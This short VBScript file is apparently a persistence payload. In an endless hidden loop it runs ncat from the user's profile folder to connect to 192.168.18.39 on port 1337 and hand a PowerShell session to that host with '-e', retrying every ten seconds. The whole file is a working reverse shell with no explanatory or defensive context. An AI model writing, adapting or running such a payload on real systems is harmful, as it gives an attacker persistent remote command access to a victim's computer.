Do While true
Set objShell = WScript.CreateObject("WScript.Shell")
  objShell.Run "cmd /c %userprofile%\\ncat.exe 192.168.18.39 1337 -e powershell", 0, True
WScript.Sleep 10000
Loop
